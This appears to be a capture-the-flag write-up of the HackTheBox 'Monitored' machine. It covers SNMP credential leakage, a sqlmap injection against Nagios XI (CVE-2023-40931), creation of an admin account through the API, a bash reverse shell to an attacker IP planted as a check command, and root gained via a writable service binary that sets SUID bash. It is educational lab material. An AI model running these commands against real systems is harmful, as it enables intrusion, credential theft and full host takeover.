---
icon: ubuntu
---

# Monitored - Medium

<figure><img src="../../.gitbook/assets/image (3236).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/monitored"><strong>Monitored</strong></a></p></figcaption></figure>

## <mark style="color:$success;">Scanning & Enumeration</mark>

{% code title="Nmap TCP" overflow="wrap" %}
```shellscript
nmap -A -T4 -p- -Pn 10.129.230.96 -oN scans/nmap-tcpall
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 16:03 -0500
Nmap scan report for 10.129.230.96
Host is up (0.049s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
| tls-alpn: 
|_  http/1.1
|_http-title: Nagios XI
5667/tcp open  tcpwrapped
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   28.67 ms 10.10.16.1
2   59.40 ms 10.129.230.96
```
{% endcode %}

{% code title="Nmap UDP" overflow="wrap" %}
```shellscript
sudo nmap -sU -p- -Pn --min-rate 10000 10.129.230.96 -oN scans/nmap-udpall
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 16:11 -0500
Warning: 10.129.230.96 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.230.96
Host is up (0.054s latency).
Not shown: 65455 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
PORT    STATE SERVICE
123/udp open  ntp
161/udp open  snmp
```
{% endcode %}

### <mark style="color:blue;">Enumerating SNMP</mark>

{% code overflow="wrap" %}
```shellscript
python3 ~/tools/SNMP-Brute/snmpbrute.py -t 10.129.230.96
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3237).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```shellscript
snmpbulkwalk -v2c -c public 10.129.230.96 . | tee snmp-public-v2c.out
```
{% endcode %}

Let's dive through the output and see what we can find. I'll check the Executables first

{% code overflow="wrap" %}
```shellscript
cat snmp-public-v2c.out | grep hrSWRunName
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3238).png" alt=""><figcaption></figcaption></figure>

There is a command run with sudo let's take a look at it

{% code overflow="wrap" %}
```shellscript
cat snmp-public-v2c.out | grep 1420
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3239).png" alt=""><figcaption></figcaption></figure>

We come across some credentials! They might be of use to us later, I'll write them down&#x20;

{% code overflow="wrap" %}
```shellscript
svc:XjH7VCehowpR1xZB
```
{% endcode %}

### <mark style="color:blue;">HTTP/HTTPS - website</mark>

<figure><img src="../../.gitbook/assets/image (3240).png" alt=""><figcaption></figcaption></figure>

On port 80 we see a redirect to https (443) and a domain and subdomain name I will add them to the hosts file

{% code overflow="wrap" %}
```shellscript
10.129.230.96	monitored.htb nagios.monitored.htb
```
{% endcode %}

#### <mark style="color:$primary;">HTTPS - 443 Certificate Inspection</mark>

<figure><img src="../../.gitbook/assets/image (3241).png" alt=""><figcaption></figcaption></figure>

We already have the domain name, possible user spotted I'll note it down

#### <mark style="color:$primary;">Website</mark>

<figure><img src="../../.gitbook/assets/image (3242).png" alt=""><figcaption></figcaption></figure>

It's an instance of Nagios XI, that redirects to the login page

<figure><img src="../../.gitbook/assets/image (3244).png" alt=""><figcaption></figcaption></figure>

What stands out in the URL is the noauth=1 parameter

A quick search for possible exploits Lead me to this, I will note it for later use



When trying to login with the credentials we discovered via SNMP we get this error

<figure><img src="../../.gitbook/assets/image (3245).png" alt=""><figcaption></figcaption></figure>

If I try a non existent user we ge the usuall login error

<figure><img src="../../.gitbook/assets/image (3246).png" alt=""><figcaption></figcaption></figure>

Which means that the svc creds are good, and that the acoount has been disabled

#### <mark style="color:$primary;">API Documentation</mark>

{% embed url="https://library.nagios.com/docs/nagios-xi/getting-started/0.-Nagios-XI-Jumpstart-Guide-Overview" %}

{% embed url="https://assets.nagios.com/downloads/nagiosxi/docs/Automated_Host_Management.pdf" %}

This PDF gives us an idea on the API's location and that we need an API key as a GET parameter

<figure><img src="../../.gitbook/assets/image (3247).png" alt=""><figcaption></figcaption></figure>

The documentation is long! I will fuzzing for the Authentication endpoint!

#### <mark style="color:$primary;">Directory Busting</mark>

{% code overflow="wrap" %}
```shellscript
feroxbuster -k -n -m GET,POST -u http://nagios.monitored.htb/nagiosxi/api/v1/
```
{% endcode %}

* -k -> ignore SSL
* -n -> no-recursion
* -m -> Scan POST & GET Requests

<figure><img src="../../.gitbook/assets/image (3248).png" alt=""><figcaption></figcaption></figure>

I am going to inspect this endpoint using BurpSuite

#### <mark style="color:$primary;">Get Auth Token</mark>

<figure><img src="../../.gitbook/assets/image (3249).png" alt=""><figcaption></figcaption></figure>

The errors are guing us through the process! Let's switch to a POST request

<figure><img src="../../.gitbook/assets/image (3250).png" alt=""><figcaption></figcaption></figure>

Now it's asking for a valid username & password. I will provide the creds discovered via SNMP

<figure><img src="../../.gitbook/assets/image (3254).png" alt=""><figcaption></figcaption></figure>

Now we have svc's auth token, it is valid for only 5 minutes! Searching for a way to use the API token I came across 2

{% embed url="https://support.nagios.com/forum/viewtopic.php?t=58783" %}

<figure><img src="../../.gitbook/assets/image (3252).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://www.exploit-db.com/exploits/51925" %}

<figure><img src="../../.gitbook/assets/image (3253).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```shellscript
https://nagios.monitored.htb/nagiosxi/login.php?token=9975aff10fe1e8e8e79d45669b47b1022cdaf6b4
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3255).png" alt=""><figcaption></figcaption></figure>

Following the link we are now logged in as svc. First thing that stands out is the version at the bottom!

## <mark style="color:$success;">Exploitation</mark>

### <mark style="color:blue;">SQLI in Nagios 5.11.0 (CVE-2023-40931)</mark>

{% embed url="https://outpost24.com/blog/nagios-xi-vulnerabilities/" %}

I found a blog on how to exploit this&#x20;

{% embed url="https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c" %}

* When a user acknowledges a banner, a POST request is sent to `/nagiosxi/admin/banner_message-ajaxhelper.php` with `action=acknowledge banner message` and a user-supplied `id`. The `id` parameter is not sanitized, leading to a SQL injection vulnerability. An authenticated low-privilege user can exploit this to extract sensitive data from tables like `xi_session` and `xi_users`, including emails, usernames, hashed passwords, API tokens, and backend tickets. The flaw does not require a valid banner ID and can be exploited at any time.

#### <mark style="color:$primary;">SQLI Steps</mark>

* First grab the cookie for our user

<figure><img src="../../.gitbook/assets/image (3256).png" alt=""><figcaption></figcaption></figure>

* Now try to build the same request described in the blog

<figure><img src="../../.gitbook/assets/image (3258).png" alt=""><figcaption></figcaption></figure>

Ok it seems to be working! Now I'll try the SQLI

<figure><img src="../../.gitbook/assets/image (3259).png" alt=""><figcaption></figcaption></figure>

Now we know SQLI is present! I'll check something else

<figure><img src="../../.gitbook/assets/image (3263).png" alt=""><figcaption></figcaption></figure>

The sleep command worked, so the SQL command is probably something like

```shellscript
SELECT * FROM something WHERE id = (USER_INPUT);
```

#### <mark style="color:$primary;">SQLMAP</mark>

I'll do this using SQLMAP

{% code overflow="wrap" %}
```shellscript
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=363iketvn555t06sg9mdlgnlnr" --batch
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3260).png" alt=""><figcaption></figcaption></figure>

Now let's dump the databases

{% code overflow="wrap" %}
```shellscript
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=363iketvn555t06sg9mdlgnlnr" --batch --dbs
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3261).png" alt=""><figcaption></figcaption></figure>

2 available DB, one is default. I will enumerate nagiosxi

{% code overflow="wrap" %}
```shellscript
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=363iketvn555t06sg9mdlgnlnr" --batch -D nagiosxi --tables
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3262).png" alt=""><figcaption></figcaption></figure>

The DB has 22 tables. I'll dump xi\_users

{% code overflow="wrap" %}
```shellscript
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=363iketvn555t06sg9mdlgnlnr" --batch -D nagiosxi -T xi_users --dump
```
{% endcode %}

{% code title="SQLMAP Output" %}
```shellscript
Database: nagiosxi
Table: xi_users
[2 entries]
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 0              | 1701427555           |
| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1699730174   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 3              | 1699697433           |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
```
{% endcode %}

Passwords are not crack able but we have the api\_key for the admin user

#### <mark style="color:$primary;">Exploiting Nagios API Keys</mark>

There is a vulnerability on `Nagios XI 5.2.6–5.4.12` that allows an attacker to create a new admin account by using `nagiosadmin` API key. Ill try to add a new admin User!

{% code overflow="wrap" %}
```shellscript
curl -d "username=deimos&password=deimos&name=deimos&email=deimos@monitored.htb&auth_level=admin&force_pw_change=0" -k 'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3264).png" alt=""><figcaption></figcaption></figure>

It worked! I'll try logging in with the new admin user account

<figure><img src="../../.gitbook/assets/image (3265).png" alt=""><figcaption></figcaption></figure>

We have access to admin options now!

#### <mark style="color:$primary;">Getting a Shell on the HOST</mark>

Now the steps to get a shell on the host:

* Go to <mark style="color:$success;">**Configure**</mark> -> <mark style="color:$success;">**Core Config Manager**</mark>

<figure><img src="../../.gitbook/assets/image (3266).png" alt=""><figcaption></figcaption></figure>

* Go to Commands

<figure><img src="../../.gitbook/assets/image (3267).png" alt=""><figcaption></figcaption></figure>

* Click on Add New

<figure><img src="../../.gitbook/assets/image (3268).png" alt=""><figcaption></figcaption></figure>

* Add a bash shell

{% code overflow="wrap" %}
```shellscript
bash -c 'bash -i &> /dev/tcp/10.10.16.96/443 0>&1'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3271).png" alt=""><figcaption></figcaption></figure>

* Save & apply configurations to the changes

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Now navigate to <mark style="color:$success;">**Configure**</mark> -> <mark style="color:$success;">**Core Config Manager**</mark> -> <mark style="color:$success;">**Hosts**</mark>
* click on <mark style="color:$success;">**localhost**</mark> -> select our shell command and click on <mark style="color:$success;">**Run Check Command**</mark>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

You should receive a shell on your listener

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:$success;">Post Exploitation</mark>

### <mark style="color:blue;">Writable Service Binary (systemd) Privilege Escalation</mark>

#### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We can run many commands as the root user. The first 11 commands are from `/etc/init.d` for the `nagios` and `npcd` binaries. None of these are present on the host

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The script that stands out to me is <mark style="color:$success;">**manager\_services.sh**</mark> let's check it out

#### <mark style="color:$primary;">manager\_services.sh</mark>

{% code overflow="wrap" %}
```bash
# Things you can do
first=("start" "stop" "restart" "status" "reload" "checkconfig" "enable" "disable")
second=("postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm")
```
{% endcode %}

The first arg is saved as `action`, and the second as `service`:

{% code overflow="wrap" %}
```shellscript
action=$1

# if service name is defined in xi-sys.cfg use that name
# else use name passed
if [ "$2" != "php-fpm" ] && [ ! -z "${!2}" ];then
    service=${!2}
else
    service=$2
fi
```
{% endcode %}

It also validates that action is in first and service in second.

{% code overflow="wrap" %}
```shellscript
# Ubuntu / Debian

if [ "$distro" == "Debian" ] || [ "$distro" == "Ubuntu" ]; then
    # Adjust the shellinabox service, no trailing 'd' in Debian/Ubuntu
    if [ "$service" == "shellinaboxd" ]; then
        service="shellinabox"
    fi

    if [ `command -v systemctl` ]; then
        `which systemctl` --no-pager "$action" "$service" $args
        return_code=$?
    else
        `which service` "$service" "$action"
        return_code=$?
    fi
fi
```
{% endcode %}

We see at the end it runs systemctl or service

#### <mark style="color:$primary;">**I'll check the services for dangerous permissions**</mark>

<mark style="color:yellow;">**Via Linpeas**</mark>

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">**Manually**</mark>

{% code overflow="wrap" %}
```shellscript
for service in "postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm"; do find /etc/systemd/ -name "$service.service"; done
```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
for service in "postgresql" "httpd" "mysqld" "nagios" "ndo2db" "npcd" "snmptt" "ntpd" "crond" "shellinaboxd" "snmptrapd" "php-fpm"; do find /etc/systemd/ -name "$service.service"; done | while read service_file; do ls -l $(cat "$service_file" | grep Exec | cut -d= -f 2 | cut -d' ' -f 1); done | sort -u
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We have write access on the service file `/usr/local/nagios/bin/nagios` &#x20;

* So far we know from the code we can run `sudo manage_services.sh restart nagios` as root.
* `nagios` is in the **allowed service whitelist**: `second=( ... "nagios" ... )`&#x20;
* Monitored is(Debian 5.10) -> `systemctl restart nagios` -> is executed as root
* The `nagios` systemd unit ultimately executes: `ExecStart=/usr/local/nagios/bin/nagios`

Now I'll save a copy of the nagios binary

{% code overflow="wrap" %}
```shellscript
mv nagios nagios.bk
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I'll create a new nagios script that will set the SUID on bash, and make it writable

{% code overflow="wrap" %}
```shellscript
echo -e '#!/bin/bash\n\nchmod +s /bin/bash' > nagios
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now I'll restart the service and it should set the SUID on bash

{% code overflow="wrap" %}
```shellscript
sudo /usr/local/nagiosxi/scripts/manage_services.sh restart nagios
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now to privesc run `/bin/bash -p`&#x20;

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
